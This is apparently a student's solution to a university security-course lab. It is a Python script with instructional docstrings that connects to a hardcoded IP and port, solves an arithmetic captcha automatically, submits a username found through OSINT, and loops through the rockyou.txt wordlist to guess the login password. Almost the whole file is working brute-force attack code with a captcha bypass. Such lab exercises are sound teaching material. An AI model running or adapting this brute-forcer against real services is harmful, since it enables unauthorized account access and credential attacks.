"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import re
import string
import time
host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "C:/Users/Lesser Evan/Documents/Notes/Comp Sci Notes/CMSC389R Notes/389Rfall2019/week/2/rockyou.txt" # Point to wordlist file

def brute_force(x):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(2)
    data = s.recv(2048)     # Receives 1024 bytes from IP/Port
    print(data)             # Prints data
    data = data.decode("utf-8")    
    print(data)
    captcha = re.search(r"(\d+) ([\*+\-\/]) (\d+) = \?$", data) 
    print(captcha)
    captch = "\n"
    a = int(captcha.group(1))
    operand = captcha.group(2)
    b = int(captcha.group(3))
    result = 0
    if operand=="+":
        result = a+b
    elif operand=="*":
        result = a*b
    elif operand=="/":
        result = a/b
    else:
        result = a-b
    captch = str(result)+"\n"
    s.send(captch.encode())
    data = s.recv(1024)     # Receives 1024 bytes from IP/Port 
    username = "ejnorman84\n"   # Hint: use OSINT
    s.send(username.encode())
    data = s.recv(1024)
    print(x)
    s.send(x.encode())
    time.sleep(1)
    data = s.recv(1024)
    print(data)
    s.close()

if __name__ == '__main__':
    rockyou = open("rockyou.txt")
    for line in rockyou:
        brute_force(line)
    rockyou.close()